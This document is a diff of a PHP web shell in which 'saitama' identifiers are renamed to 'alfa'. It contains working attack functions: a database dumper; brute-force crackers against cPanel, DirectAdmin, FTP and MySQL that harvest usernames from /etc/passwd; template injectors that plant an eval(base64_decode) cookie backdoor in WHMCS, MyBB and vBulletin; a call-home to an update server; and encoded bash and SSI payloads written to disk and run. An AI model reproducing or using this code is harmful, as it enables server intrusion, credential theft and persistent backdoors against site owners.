+alfafooter();
 }
-function saitamaDumper(){
-saitamahead();
+function alfaDumper(){
+alfahead();
 echo('<div class="header">');
-saitamaNum(8,9,10);
+AlfaNum(8,9,10);
 echo "<center><br><div class='txtfont_header'>| Mysql Database Dumper |</div><br><br>".getConfigHtml('all')."<form method='post' onsubmit=\"g('dumper',null,null,null,this.db_username.value,this.db_password.value,this.db_name.value,this.dfile.value,this.db_host.value); return false;\"><p>";
 $table = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
@@ -1698,21 +1699,21 @@ $table = array('td1' =>
  'td4' =>
  array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
  'td5' =>
- array('color' => 'FFFFFF', 'tdName' => 'Dump Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars($GLOBALS['cwd']).'saitama.sql', 'inputSize' => '50')
+ array('color' => 'FFFFFF', 'tdName' => 'Dump Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars($GLOBALS['cwd']).'alfa.sql', 'inputSize' => '50')
 );
 create_table($table);
 echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
-$username = ($_POST['saitama3']);
-$password = ($_POST['saitama4']);
-$dbname = ($_POST['saitama5']);
-$dfile = ($_POST['saitama6']);
-$host = ($_POST['saitama7']);
+$username = ($_POST['alfa3']);
+$password = ($_POST['alfa4']);
+$dbname = ($_POST['alfa5']);
+$dfile = ($_POST['alfa6']);
+$host = ($_POST['alfa7']);
 if(!empty($dbname)){
 echo __pre();
 $msg = "<center>Check this :  <font color='red'>".$dfile."</font></center>";
 if(@mysqli_connect($host,$username,$password,$dbname)){
-if(strlen(saitamaEx("mysqldump"))>0){
-saitamaEx("mysqldump --single-transaction --host=\"$host\" --user=\"$username\" --password=\"$password\" $dbname > '".addslashes($dfile)."'");
+if(strlen(alfaEx("mysqldump"))>0){
+alfaEx("mysqldump --single-transaction --host=\"$host\" --user=\"$username\" --password=\"$password\" $dbname > '".addslashes($dfile)."'");
 echo($msg);
 }else{
 __alert("Error...!");
@@ -1722,9 +1723,9 @@ echo('<center>mysqli_connect : Error!</center>');
 }
 }
 echo('</div>');
-saitamafooter();
+alfafooter();
 }
-function saitama_DirectAdmin_Cracker($info){
+function Alfa_DirectAdmin_Cracker($info){
 if(!$info['mysql'])
 $url = $info['protocol'].$info['target'].':'.$info['port'].'/CMD_LOGIN';
 else $url = $info['protocol'].$info['target'].'/phpmyadmin';
@@ -1749,7 +1750,7 @@ CrackerResualt($info);
 }
 curl_close($curl);
 }
-function saitama_CP_Cracker($info){
+function Alfa_CP_Cracker($info){
 $url = $info['protocol'].$info['target'].':'.$info['port'];
 $curl = curl_init();
 curl_setopt($curl, CURLOPT_FOLLOWLOCATION,1);
@@ -1771,7 +1772,7 @@ CrackerResualt($info);
 }
 curl_close($curl);
 }
-function saitama_FTP_Cracker($info){
+function Alfa_FTP_Cracker($info){
 $url = $info['protocol'].$info['target'];
 $curl = curl_init();
 curl_setopt($curl, CURLOPT_URL, $url);
@@ -1789,13 +1790,13 @@ CrackerResualt($info);
 }
 curl_close($curl);
 }
-function saitama_Mysql_Cracker($info){
+function Alfa_Mysql_Cracker($info){
 if(@mysqli_connect($info['target'].':'.$info['port'],$info['username'],$info['password'])){
 CrackerResualt($info);
 echo 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
 }
 }
-function saitama_FTPC($info){
+function Alfa_FTPC($info){
 if($con=@ftp_connect($info['target'],$info['port'])){
 if($con){
 $login=@ftp_login($con,$info['username'],$info['password']);
@@ -1808,12 +1809,12 @@ $c = @fopen($info['fcrack'],'a+');
 @fwrite($c, $res);
 @fclose($c);
 }
-function saitama_Call_Function_Cracker($method,$info){
-switch($method){case 'cp':return saitama_CP_Cracker($info);break;case 'direct': case 'phpmyadmin':return saitama_DirectAdmin_Cracker($info);break;case 'ftp':return saitama_FTP_Cracker($info);break;case 'mysql':return saitama_Mysql_Cracker($info);break;case 'mysql':return saitama_FTPC($info);break;}
+function Alfa_Call_Function_Cracker($method,$info){
+switch($method){case 'cp':return Alfa_CP_Cracker($info);break;case 'direct': case 'phpmyadmin':return Alfa_DirectAdmin_Cracker($info);break;case 'ftp':return Alfa_FTP_Cracker($info);break;case 'mysql':return Alfa_Mysql_Cracker($info);break;case 'mysql':return Alfa_FTPC($info);break;}
 }
-function saitamaCrackers(){
-saitamahead();
-saitamaNum(9,10);
+function alfaCrackers(){
+alfahead();
+AlfaNum(9,10);
 echo '<div class="header"><center><br><div class="txtfont_header">| Brute Forcer |</div><br><br><form method="post" onsubmit="g(\'Crackers\',null,this.target.value,this.port.value,this.usernames.value,this.passwords.value,this.fcrack.value,\'start\',this.protocol.value,this.loginpanel.value);return false;"><div class="txtfont">Login Page: <select onclick="dis_input(this.value);" name="loginpanel">';
 foreach(array('cp'=>'Cpanel','direct'=>'DirectAdmin','ftp'=>'FTP','phpmyadmin'=>'PhpMyAdmin[DirectAdmin]','mysql'=>'mysql_connect()','ftpc'=>'ftp_connect()') as $key=>$val)echo('<option value="'.$key.'">'.$val.'</option>');
 echo '</select> Protocol: <select id="protocol" name="protocol">';
@@ -1821,18 +1822,18 @@ foreach(array('https://','http://','ftp://') as $val)echo('<option value="'.$val
 echo '</select> Website/ip Address: <input id="target" type="text" name="target" value="localhost">
 Port: <input id="port" type="text" name="port" value="2083">
 <table width="30%"><td align="center">Users List</td><td align="center">Passwords</td></table>
-<textarea placeholder="Users" rows="20" cols="25" name="usernames">'.($GLOBALS['sys']=='unix'?saitamaEx("cut -d: -f1 /etc/passwd"):"").'</textarea>
+<textarea placeholder="Users" rows="20" cols="25" name="usernames">'.($GLOBALS['sys']=='unix'?alfaEx("cut -d: -f1 /etc/passwd"):"").'</textarea>
 &nbsp <textarea placeholder="Passwords" rows="20" cols="25" name="passwords"></textarea><br><br>
 Save Result Into File <input type="text" name="fcrack" value="cracked.txt">
 <p><input type="submit" name="cracking" value=" " /></div></form></p><center>';
-$target = str_replace(array('https://','http://','ftp://'),'',$_POST['saitama1']);
-$port = $_POST['saitama2'];
-$usernames= $_POST['saitama3'];
-$passwords = $_POST['saitama4'];
-$fcrack = $_POST['saitama5'];
-$cracking = $_POST['saitama6'];
-$protocol = $_POST['saitama7'];
-$loginpanel = $_POST['saitama8'];
+$target = str_replace(array('https://','http://','ftp://'),'',$_POST['alfa1']);
+$port = $_POST['alfa2'];
+$usernames= $_POST['alfa3'];
+$passwords = $_POST['alfa4'];
+$fcrack = $_POST['alfa5'];
+$cracking = $_POST['alfa6'];
+$protocol = $_POST['alfa7'];
+$loginpanel = $_POST['alfa8'];
 $p = $loginpanel == 'phpmyadmin' ? $p = true : false;
 if($cracking=='start'){
 echo __pre();
@@ -1841,23 +1842,23 @@ $expw = explode("\n",$passwords);
 foreach($exuser as $user){
 foreach($expw as $pw){
 $array = array('username' => trim($user),'password' => trim($pw),'port' => trim($port),'target' => trim($target),'protocol' => trim($protocol),'fcrack' => trim($fcrack),'mysql' => $p);
-saitama_Call_Function_Cracker($loginpanel,$array);
+Alfa_Call_Function_Cracker($loginpanel,$array);
 }
 }
 echo '<br><font color="red">Attack Finished...</font>';
 }
 echo '</div>';
-saitamafooter();
+alfafooter();
 }
 function output($string){ echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='".$string."'>Click Here !</a></font></b></center><br><br>";}
-function saitamaShellInjectors(){
-saitamahead();
+function alfaShellInjectors(){
+alfahead();
 echo '<div class=header>';
-saitamaNum(11);
+AlfaNum(11);
 echo '<center><p><div class="txtfont_header">| Cms Shell Injector |</div></p><center><h3><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,\'whmcs\',null)">| WHMCS | </a><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,null,\'mybb\')">| MyBB | </a><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,null,null,\'vb\')">| vBulletin |</a></h3></center>';
 $selector = '<p><div class="txtfont">Shell Inject Method : </div> <select name="method" style="width:100px;"><option value="auto">AutoMatic</option><option value="man">Manuel</option></select></p>';
-if(isset($_POST['saitama1']) && $_POST['saitama1']== 'whmcs'){
-saitamaNum();
+if(isset($_POST['alfa1']) && $_POST['alfa1']== 'whmcs'){
+AlfaNum();
 echo __pre()."<p><div class='txtfont_header'>| WHMCS |</div></p><center><center><p>".getConfigHtml('whmcs')."</p><form onSubmit=\"g('ShellInjectors',null,'whmcs',null,null,this.method.value,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.path.value); return false;\" method='post'>";
 $table = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Path WHMCS Url : ', 'inputName' => 'path', 'inputValue' => 'http://site.com/whmcs', 'inputSize' => '50'),
@@ -1873,14 +1874,14 @@ $table = array('td1' =>
 create_table($table);
 echo $selector;
 echo "<p><input type='submit' value=' '></p></form></center></td></tr></table></center>";
-if(isset($_POST['saitama6'])) {
-$dbu = $_POST['saitama6'];
-$dbn = $_POST['saitama7'];
-$dbp = $_POST['saitama8'];
-$dbh = $_POST['saitama9'];
-$path = $_POST['saitama10'];
-$method = $_POST['saitama4'];
-$index = "{php}".saitama_UPLOADER.";{/php}";
+if(isset($_POST['alfa6'])) {
+$dbu = $_POST['alfa6'];
+$dbn = $_POST['alfa7'];
+$dbp = $_POST['alfa8'];
+$dbh = $_POST['alfa9'];
+$path = $_POST['alfa10'];
+$method = $_POST['alfa4'];
+$index = "{php}".ALFA_UPLOADER.";{/php}";
 $newin = str_replace("'","\'",$index);
 $newindex = "<p>Dear $newin,</p><p>Recently a request was submitted to reset your password for our client area. If you did not request this, please ignore this email. It will expire and become useless in 2 hours time.</p><p>To reset your password, please visit the url below:<br /><a href=\"{\$pw_reset_url}\">{\$pw_reset_url}</a></p><p>When you visit the link above, your password will be reset, and the new password will be emailed to you.</p><p>{\$signature}</p>{php}if(\$_COOKIE[\"sec\"] == \"123\"){eval(base64_decode(\$_COOKIE[\"sec2\"])); die(\"!\");}{\/php}";
 if(!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($index)){
@@ -1896,18 +1897,18 @@ $result = mysqli_query($conn,$inject) or die (mysqli_error($conn));
 $create = "insert into tblclients (email) values('solevisible@fbi.gov')";
 $result2 = mysqli_query($conn,$create) or die (mysqli_error($conn));
 if(function_exists('curl_version') && $method == 'auto'){
-$saitamaSole = new saitamaCURL(true);
-$saveurl = $saitamaSole->Send($path."/pwreset.php");
+$AlfaSole = new AlfaCURL(true);
+$saveurl = $AlfaSole->Send($path."/pwreset.php");
 $getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
-$saitamaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=solevisible@fbi.gov");
+$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=solevisible@fbi.gov");
 $backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
 $Solevisible = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
 __alert("shell injectet...");
 $ff= 'http://'.$path."/solevisible.php";
 output($ff);}else{
-echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#00ffff\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#00ffff'> And Reset Password With Email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color='#00ffff'>And Go To => </font><a href='".$path."/solevisible.php' target='_blank'>".$path."/solevisible.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
-}if(isset($_POST['saitama2']) && $_POST['saitama2']== 'mybb'){
-saitamaNum(1,2,3,5);
+echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/solevisible.php' target='_blank'>".$path."/solevisible.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
+}if(isset($_POST['alfa2']) && $_POST['alfa2']== 'mybb'){
+AlfaNum(1,2,3,5);
 echo __pre()."<p><div class='txtfont_header'>| MyBB |</div></p><center><center>".getConfigHtml("mybb")."<form id='sendajax' onSubmit=\"g('ShellInjectors',null,null,'mybb',null,this.method.value,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.prefix.value); return false;\" method=POST>
 ";
 $table = array('td1' =>
@@ -1924,14 +1925,14 @@ $table = array('td1' =>
 create_table($table);
 echo $selector;
 echo "<p><input type=submit value=' '></p></form></center></center>";
-if(isset($_POST['saitama6'])) {
-$dbu = $_POST['saitama6'];
-$dbn = $_POST['saitama7'];
-$dbp = $_POST['saitama8'];
-$dbh = $_POST['saitama9'];
-$prefix = $_POST['saitama10'];
-$method = $_POST['saitama4'];
-$shellCode = "{\${".saitama_UPLOADER."}}";
+if(isset($_POST['alfa6'])) {
+$dbu = $_POST['alfa6'];
+$dbn = $_POST['alfa7'];
+$dbp = $_POST['alfa8'];
+$dbh = $_POST['alfa9'];
+$prefix = $_POST['alfa10'];
+$method = $_POST['alfa4'];
+$shellCode = "{\${".ALFA_UPLOADER."}}";
 $newinshell = str_replace("'","\'",$shellCode);
 if (!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($newinshell)){
 $conn = mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_error($conn));
@@ -1950,7 +1951,7 @@ $furl = $rowb['value'];
 $realurl = parse_url($furl,PHP_URL_HOST);
 $realpath = parse_url($furl,PHP_URL_PATH);
 $res = false;
-$saitamaCurl = new saitamaCURL();
+$AlfaCurl = new AlfaCURL();
 if (extension_loaded('sockets') && function_exists('fsockopen') && $method == 'auto' ){
 if ($fsock = @fsockopen($realurl, 80, $errno, $errstr, 10)){
 @fputs($fsock, "GET $realpath/calendar.php HTTP/1.1\r\n");
@@ -1961,7 +1962,7 @@ if(preg_match("/200 OK/i",$check)){
 $repairdbtemp = "update {$prefix}templates SET template= '$repsave' where title = 'calendar'";
 $clear = mysqli_query($conn,$repairdbtemp) or die (mysqli_error($conn));$res = true;}
 @fclose($fsock);}}elseif(function_exists('curl_version') && $method == 'auto'){
-$saitamaCurl->Send($realurl.$realpath."/calendar.php");
+$AlfaCurl->Send($realurl.$realpath."/calendar.php");
 $res = true;
 }
 if($res){
@@ -1970,10 +1971,10 @@ output($ff);
 }else{
 $ff = 'http://'.$realurl.$realpath."/calendar.php";
 $fff = 'http://'.$realurl.$realpath."/solevisible.php";
-echo "<br><pre id='strOutput' style='margin-top:5px' class='ml1'><br><center><b><font color='#00ffff'>Please Go To Target => </font><a href='".$ff."' target='_blank'>".$ff."</a><br/><font color='#00ffff'>And Go To => </font><a href='".$fff."' target='_blank'>".$fff."</a></b></center><br><br>";
+echo "<br><pre id='strOutput' style='margin-top:5px' class='ml1'><br><center><b><font color='#FFFFFF'>Please Go To Target => </font><a href='".$ff."' target='_blank'>".$ff."</a><br/><font color='#FFFFFF'>And Go To => </font><a href='".$fff."' target='_blank'>".$fff."</a></b></center><br><br>";
 }}}}
-if(isset($_POST['saitama3']) && $_POST['saitama3']== 'vb'){
-saitamaNum(1,2,7,9,10);
+if(isset($_POST['alfa3']) && $_POST['alfa3']== 'vb'){
+AlfaNum(1,2,7,9,10);
 echo __pre().'<p><div class="txtfont_header">| vbulletin |</div></p><p>'.getConfigHtml('vb').'</p><form name="frm" method="POST" onsubmit="g(\'ShellInjectors\',null,null,this.lo.value,\'vb\',this.user.value,this.pass.value,this.tab.value,this.db.value,this.method.value); return false;">';
 $table = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Host : ', 'inputName' => 'lo', 'id'=>'db_host','inputValue' => 'localhost', 'inputSize' => '50'),
@@ -1989,29 +1990,29 @@ $table = array('td1' =>
 create_table($table);
 echo $selector;
 echo '<p><input type="submit" value=" " /></p></form></center>';
-if(isset($_POST['saitama4'])&&!empty($_POST['saitama4'])){
-$method = $_POST['saitama8'];
+if(isset($_POST['alfa4'])&&!empty($_POST['alfa4'])){
+$method = $_POST['alfa8'];
 $faq_name = "faq";
 $faq_file = "/faq.php";
-$code = "{\${".saitama_UPLOADER."}}{\${exit()}}&";
-$conn=@mysqli_connect($_POST['saitama2'],$_POST['saitama4'],$_POST['saitama5'],$_POST['saitama7']) or die(@mysqli_connect_error());
-$rec = "select `template` from ".$_POST['saitama6']."template WHERE title ='".$faq_name."'";
+$code = "{\${".ALFA_UPLOADER."}}{\${exit()}}&";
+$conn=@mysqli_connect($_POST['alfa2'],$_POST['alfa4'],$_POST['alfa5'],$_POST['alfa7']) or die(@mysqli_connect_error());
+$rec = "select `template` from ".$_POST['alfa6']."template WHERE title ='".$faq_name."'";
 $recivedata = @mysqli_query($conn,$rec);
 $getd = @mysqli_fetch_assoc($recivedata);
 $savetoass = $getd['template'];
 if(empty($savetoass)){
 	$faq_name = "header";
 	$faq_file = "/";
-	$rec = "select `template` from ".$_POST['saitama6']."template WHERE title ='".$faq_name."'";
+	$rec = "select `template` from ".$_POST['alfa6']."template WHERE title ='".$faq_name."'";
 	$recivedata = @mysqli_query($conn,$rec);
 	$getd = @mysqli_fetch_assoc($recivedata);
 	$savetoass = $getd['template'];
-	$code = saitama_UPLOADER.";";
+	$code = ALFA_UPLOADER.";";
 }
 $code = str_replace("'","\'",$code);
-$p = "UPDATE ".$_POST['saitama6']."template SET `template`='".$code."' WHERE `title`='".$faq_name."'";
+$p = "UPDATE ".$_POST['alfa6']."template SET `template`='".$code."' WHERE `title`='".$faq_name."'";
 $ka= @mysqli_query($conn,$p) or die(mysqli_error($conn));
-$geturl = @mysqli_query($conn,"select `value` from ".$_POST['saitama6']."setting WHERE `varname`='bburl'");
+$geturl = @mysqli_query($conn,"select `value` from ".$_POST['alfa6']."setting WHERE `varname`='bburl'");
 $getval = @mysqli_fetch_assoc($geturl);
 $saveval = $getval['value'];
 if($faq_name == "header"){
@@ -2022,7 +2023,7 @@ if($faq_name == "header"){
 $realurl = parse_url($saveval,PHP_URL_HOST);
 $realpath = parse_url($saveval,PHP_URL_PATH);
 $res = false;
-$saitamaCurl = new saitamaCURL();
+$AlfaCurl = new AlfaCURL();
 if(extension_loaded('sockets') && function_exists('fsockopen') && $method == 'auto'){
 if($fsock = @fsockopen($realurl, 80, $errno, $errstr, 10)){
 @fputs($fsock, "GET $realpath.$faq_file HTTP/1.1\r\n");
@@ -2030,15 +2031,15 @@ if($fsock = @fsockopen($realurl, 80, $errno, $errstr, 10)){
 @fputs($fsock, "Connection: close\r\n\r\n");
 $check = fgets($fsock);
 if(preg_match("/200 OK/i",$check)){
-$p1 = "UPDATE ".$_POST['saitama6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
+$p1 = "UPDATE ".$_POST['alfa6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
 $ka1= @mysqli_query($conn,$p1) or die(mysqli_error($conn));
 $res = true;
 }
 @fclose($fsock);
 }
 }elseif(function_exists('curl_version') && $method == 'auto'){
-$saitamaCurl->Send($realurl.$realpath.$faq_file);
-$p1 = "UPDATE ".$_POST['saitama6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
+$AlfaCurl->Send($realurl.$realpath.$faq_file);
+$p1 = "UPDATE ".$_POST['alfa6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
 $ka1= @mysqli_query($conn,$p1) or die(mysqli_error($conn));
 $res = true;
 }
@@ -2048,11 +2049,11 @@ output($ff);
 }else{
 $ff = 'http://'.$realurl.$realpath.$faq_file;
 $fff = 'http://'.$realurl.$realpath."/solevisible.php";
-echo "<center><p><font color=\"#00ffff\">First Open This Link => </font><a href='".$ff."' target='_blank'>".$ff."</a><br/><font color=\"#00ffff\">Second Open This Link => </font><a href='".$fff."' target='_blank'>".$fff."</a></center></p>";}}}
+echo "<center><p><font color=\"#FFFFFF\">First Open This Link => </font><a href='".$ff."' target='_blank'>".$ff."</a><br/><font color=\"#FFFFFF\">Second Open This Link => </font><a href='".$fff."' target='_blank'>".$fff."</a></center></p>";}}}
 echo '</div>';
-saitamafooter();
+alfafooter();
 }
-function saitamacheckfiletype(){
+function alfacheckfiletype(){
 	$path = $_POST['path'];
 	$arg = $_POST['arg'];
 	if(@is_file($path.'/'.$arg)){
@@ -2061,25 +2062,25 @@ function saitamacheckfiletype(){
 		echo("dir");
 	}
 }
-function saitamacheckupdate(){
+function alfacheckupdate(){
 	if($GLOBALS["DB_NAME"]["cgi_api"]){
-		if(!isset($_COOKIE["saitamacgiapi_mode"])&&!isset($_COOKIE["saitamacgiapi"])){
-			_saitama_cgicmd("whoami","perl",true);
-			if(strlen(saitamaEx("whoami",false,true))>0){
-				__saitama_set_cookie("saitama_canruncmd", "true");
+		if(!isset($_COOKIE["alfacgiapi_mode"])&&!isset($_COOKIE["alfacgiapi"])){
+			_alfa_cgicmd("whoami","perl",true);
+			if(strlen(alfaEx("whoami",false,true))>0){
+				__alfa_set_cookie("alfa_canruncmd", "true");
 			}
 		}
 	}
 	if(function_exists("curl_version")){
-		$update = new saitamaCURL();
-		$json = $update->Send("http://solevisible.com/update.json?ver=".__saitama_VERSION__);
+		$update = new AlfaCURL();
+		$json = $update->Send("http://solevisible.com/update.json?ver=".__ALFA_VERSION__);
 		$json = @json_decode($json,true);
 		$data = array();
 		if($json){
-			if(!isset($_COOKIE['saitama_checkupdate']) && !empty($json["type"])){
+			if(!isset($_COOKIE['alfa_checkupdate']) && !empty($json["type"])){
 				if($json["type"] == "update"){
-					if(__saitama_VERSION__ != $json['version'] || __saitama_UPDATE__ != $json['version_number']){
-						@setcookie("saitama_checkupdate", "1", time()+86400);
+					if(__ALFA_VERSION__ != $json['version'] || __ALFA_UPDATE__ != $json['version_number']){
+						@setcookie("alfa_checkupdate", "1", time()+86400);
 						$data["content"] = '<div class="update-holder">'.$json["content"].'</div>';
 					}
 				}
@@ -2095,7 +2096,7 @@ function saitamacheckupdate(){
 			}
 			if(isset($json["code_name"]) && !empty($json["code_name"])){
 				$data["code_name"] = $json["code_name"];
-				$data["version_number"] = __saitama_VERSION__;
+				$data["version_number"] = __ALFA_VERSION__;
 			}
 			if(isset($json["market"]) && !empty($json["market"])){
 				$data["market"] = $json["market"];
@@ -2104,60 +2105,60 @@ function saitamacheckupdate(){
 		}
 	}
 }
-function saitamaWriteTocgiapi($name, $source){
+function alfaWriteTocgiapi($name, $source){
 	$temp = "";
-	$not_api = array("basedir.saitama", "getdir.saitama", "getheader.saitama");
+	$not_api = array("basedir.alfa", "getdir.alfa", "getheader.alfa");
 	if(in_array($name, $not_api)){
-		$temp = saitama_TEMPDIR;
+		$temp = ALFA_TEMPDIR;
 		if($temp){
 			@chdir($temp);
 		}
 	}else{
-		saitamaCreateParentFolder();
-		@chdir($GLOBALS['home_cwd'] . "/" . __SAITAMA_DATA_FOLDER__);
+		alfaCreateParentFolder();
+		@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
 	}
-	@mkdir('saitamacgiapi',0755);
-	__write_file("saitamacgiapi/".$name, __get_resource($source));
-	@chmod("saitamacgiapi/".$name, 0755);
+	@mkdir('alfacgiapi',0755);
+	__write_file("alfacgiapi/".$name, __get_resource($source));
+	@chmod("alfacgiapi/".$name, 0755);
 	return $temp;
 }
-function saitamacheckcgi(){if(strlen(saitamaEx("id",false,true,true))>0)echo("ok");else echo("no");}
-function saitamaupdateheader(){
+function alfacheckcgi(){if(strlen(alfaEx("id",false,true,true))>0)echo("ok");else echo("no");}
+function alfaupdateheader(){
 	if(!isset($_COOKIE["updateheader_data"])){
 		$bash = "zZRdb9owFIavya849dIGJLK0vVyFNFTohERBgtFdQIRM4hAL40R2UkYp/312gPARqLqbaYnyIfs8x+85r+UvV04qhTOh3JGhMeg3nwbtWnnqecDUoz8+zPGMQBzGEBPBIF4mYcRBpJMlJFjA9I3GMNm+MAvwPXCFRR5OCMiU+pqqGI3ur067W280e/1aeTElCQQk8UJgS/4bGOUzCV6q0usZtojtORUiEhWDeGEENgFrhVJJgpShb8ORZxlBJIAC5WCuNqqH3931A/iRAepahNQLa2Y5+4JJK0ZpOIQrsN8AmdkgAteFmxvY5R8hk45Q1VK5q4YfcZKvjEbqdqsjD+3FID9acBZhn4iinoNS/62olOM5UXqQZZazf7AxvKu+JmB7d/bd/W3FyiDrEJJEUH9LyQTrWEDXKQzhegAuUtpu0RluKqI0PgNONfjjA9CP5phyqUE98dLq/RzU2+NG97ne6vRryFH7wnmlIkkxczbBqtlESGR06s/Nxvix23nahuki/a9exANkvNTbrXq/mWfAjGJJpKNneuMMVVOvWGwoNU4DUAbobponKrQRD5CEhBulbZT4OKq0K9As48UMrGansYoF5Ql0emsLTtEK7PqgLYQSYftljhpwYQ0mC3HvsPDAZseZjxKb+/79jfQ9VcgtyQGOHrFiegT7aguc2ANuRgTUyAWRgiC99XNDtm4Wx7deXrLogLvQt4OYsz07duP8isWUedB/7sOnXbgs9KT2w6CzxW/0fX6baH35ceGu1SnxBw==";
 		$realdir = addslashes(dirname($_SERVER["SCRIPT_FILENAME"]));
-		$tmp_path = saitamaWriteTocgiapi("getheader.saitama",$bash);
-		$data = saitamaEx("cd '{$tmp_path}/saitamacgiapi';sh getheader.saitama",false,true,true);
+		$tmp_path = alfaWriteTocgiapi("getheader.alfa",$bash);
+		$data = alfaEx("cd '{$tmp_path}/alfacgiapi';sh getheader.alfa",false,true,true);
 		if(@is_array(@json_decode($data,true))){
-			__saitama_set_cookie("updateheader_data", __ZW5jb2Rlcg($data));
+			__alfa_set_cookie("updateheader_data", __ZW5jb2Rlcg($data));
 			echo $data;
 		}
 	}else{
 		echo __ZGVjb2Rlcg($_COOKIE["updateheader_data"]);
 	}
 }
-function saitamassiShell(){
-saitamahead();
+function alfassiShell(){
+alfahead();
 echo '<div class=header>';
-saitamaCreateParentFolder();
-@chdir($GLOBALS['home_cwd'] . "/" . __SAITAMA_DATA_FOLDER__);
-@mkdir('saitama_shtml',0755);
-@chdir('saitama_shtml');
-saitamacgihtaccess('shtml');
+alfaCreateParentFolder();
+@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
+@mkdir('alfa_shtml',0755);
+@chdir('alfa_shtml');
+alfacgihtaccess('shtml');
 $code = 'rVb9b9s2EP1Xrky22MhsKcu6ptbH0A+vzYbCXeztl6YoZImS2VCkQFJOvCX/+46SrChOnKRBA8ORyOPju3ePR/vPBoOdWIqUZUCVynUWkE9jpaT6TAaD0O9Ma/YvTXMTkPnKUN3OshToRaEC0jslu+9ns49f3kwmfx6PTwkEcEpOSR8uL8FOnoz/+ns8nX35MJ69n7zF+Wc24N14hjEE1niaGlhGiKcXnOATL2lAuIYBj66DKNf03hVdJterRIJs8Q2+C/OPk+kW6kzELXVnOLzjQ03sFJHW58lDSXWwNpOCzawWJuehv6BREvqGGU7DVzyNYEajHKbTY5guKOe+U0/5OlasMMAjkZVRhlS/RsuoHiRhWorYMCkgkcz0IJcJhT78x9IejsRlToUZxlKeMWrFIMROIl+oxzQquBE21AW3SMTDWC+VqmfzA4aRrof//PXSIaciMwsP9vcZ9Dc3C9Zhn3DNZ9hHPCwiU1QHs0X5E7gH8Eck4ODlCxdcd1R94N2HGfGubkO1Ixk1Y07t4+vVcbJOd1jJ7rVRXMaR1WSoKJdR0ut7V61MRmYZpz1giVViO7KdH2qz4nSYMJQkWiGP3jeFo9xCCor2/A3IHEmdERg1Y96V79QlDH2nNsJcJiuQwjIOyLaN9mKZ55FI9vrDFEM05kZgnsWSS/Tgjlv9EYg4E2fYAVAWNGXnBbdRoZ+wZejHiEnxZXEY+qkUBtYgz1/G8eEhCS/hDlfCpe/YaEsbFzprFAvbPod+2WDaZhSQ/QOCmcWcxcijqcAeFcs9y75SLSBxqbRUo0IyC+JVZEaKJh4Jx2LJlLQaABOpbAngJs68wwHTwkIEBJFb2KYaI6t6A7rz64tXr9/+7jViFIrWR7lQdmuxtEfbqUbttFOJVX/f0u5xmWK/e2Smb+rqAh470HUT2JJrTchmjLXOBKJWEwTOWWIWATlw3R/QGVIlFGuKlrDCVI23YTGP4rNMyVIkg0aW2jzezZ57/31QNcUbEt9sdY3E8w2H1QWwhUXK0Fi6TXUejn4Uc1143W8EUDnk1CwkJoKnwuqsy3nOjD0t2LGuj4atLBNFacCsCkzV0AsMrwt01EjRBJOwge/G17DtzXBSCgR0LIFbPt8o/WaCJ1SX3HQyu3lgLLFI0ahzgukv1E2OKiSNVfwZQZU8t4/PSXP9XNAY4jwJdrGc1T3krHHwaql8AX5r129zKl5ij3TqpKCqarIaUSBlnOoHz2V1RT7Srt/JpfXdX9m0Rny6Wf9h9LxKFHrYjkwZcexGMS8T2h91KvyQdQup7/Du0gLf69wjt9KwCnySa7flNUX0BxLYtrTSL7X0oJEk2EVNrJj1yuonaNf+T3Z9I/WtfTrmv9WuHXul2ovK/tz6Hw==';
-@__write_file('saitama_ssi.shtml',__get_resource($code));
-@chmod("saitama_ssi.shtml",0755);
-echo saitamaiFrameCreator('saitama_shtml/saitama_ssi.shtml');
